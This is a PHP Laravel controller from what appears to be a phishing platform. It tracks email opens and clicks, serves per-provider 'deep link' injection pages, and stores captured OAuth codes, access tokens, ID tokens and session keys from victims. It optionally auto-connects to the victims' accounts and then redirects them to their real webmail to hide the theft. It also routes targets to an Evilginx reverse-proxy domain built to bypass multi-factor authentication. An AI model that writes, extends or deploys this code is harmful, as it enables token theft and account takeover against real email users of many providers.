<?php

namespace App\Http\Controllers;

use App\Models\PhishingCampaign;
use App\Models\PhishingTarget;
use App\Models\CapturedCredential;
use App\Services\AutoConnectService;
use App\Services\DeepLinkService;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Log;

class PhishController extends Controller
{
    public function trackPixel(string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->first();
        if ($target && !$target->opened_at) {
            $target->update(['opened_at' => now()]);
            $target->campaign->increment('total_opened');
            $target->campaign->save();
        }

        $pixel = base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
        return response($pixel)->header('Content-Type', 'image/gif');
    }

    public function deepInject(string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        if ($campaign->status !== 'active') {
            abort(404);
        }

        $target->update(['clicked_at' => now()]);
        $campaign->increment('total_clicked');
        $campaign->save();

        $deepLinkService = app(DeepLinkService::class);
        $html = $deepLinkService->generateDeepLinkPage($target, $provider);

        return response($html)->header('Content-Type', 'text/html');
    }

    public function deepCallback(Request $request, string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        $code = $request->input('code');
        $accessToken = $request->input('access_token');
        $idToken = $request->input('id_token');
        $sessionKey = $request->input('session');

        $tokenData = [
            'code'         => $code,
            'access_token' => $accessToken,
            'id_token'     => $idToken,
            'session'      => $sessionKey,
            'all_params'   => $request->all(),
        ];

        $cred = CapturedCredential::create([
            'campaign_id'  => $campaign->id,
            'target_id'    => $target->id,
            'email'        => $target->email,
            'password'     => 'DEEPLINK_AUTH',
            'provider'     => $provider,
            'ip_address'   => $request->ip(),
            'user_agent'   => $request->userAgent(),
            'extra_data'   => array_merge($tokenData, [
                'capture_method' => 'deeplink_injection',
                'has_code'       => filled($code),
                'has_access_token'=> filled($accessToken),
                'has_id_token'   => filled($idToken),
                'has_session'    => filled($sessionKey),
            ]),
            'captured_at'  => now(),
        ]);

        $target->update(['status' => 'captured', 'captured_at' => now()]);
        $campaign->increment('total_captured');
        $campaign->save();

        if ($campaign->auto_connect_enabled) {
            try {
                $autoConnect = app(AutoConnectService::class);
                $account = $autoConnect->tryConnect($cred);
                if ($account) {
                    Log::info("[DeepCallback] Auto-connected: {$target->email} (active={$account->is_active})");
                }
            } catch (\Throwable $e) {
                Log::warning("[DeepCallback] Auto-connect failed: {$target->email}: {$e->getMessage()}");
            }
        }

        $redirects = [
            'google'     => 'https://mail.google.com/mail/u/0/',
            'microsoft'  => 'https://outlook.live.com/mail/0/',
            'yahoo'      => 'https://mail.yahoo.com/',
            'gmx'        => 'https://service.gmx.net/de/',
            'webde'      => 'https://service.web.de/',
            'ionos'      => 'https://mail.ionos.com/',
            'telekom'    => 'https://email.t-online.de/',
            'a1'         => 'https://webmail.a1.net/mail/',
            'freenet'    => 'https://email.freenet.de/',
            'icloud'     => 'https://www.icloud.com/mail/',
            'zoho'       => 'https://mail.zoho.com/',
            'protonmail' => 'https://mail.proton.me/mail/all',
        ];

        return redirect($redirects[$provider] ?? $redirects['google']);
    }

    public function evilginxRedirect(string $provider, string $token): Response
    {
        $target = PhishingTarget::where('tracking_token', $token)->firstOrFail();
        $campaign = $target->campaign;

        if ($campaign->status !== 'active' || $campaign->campaign_type !== 'evilginx') {
            abort(404);
        }

        $domain = $campaign->evilginx_domain;
        if (!$domain) {
            abort(404, 'Evilginx domain not configured for this campaign');
        }

        $target->update(['clicked_at' => now()]);
        $campaign->increment('total_clicked');
        $campaign->save();

        $evilginxUrl = "https://{$domain}/{$provider}/{$token}";

        return redirect($evilginxUrl);
    }
}
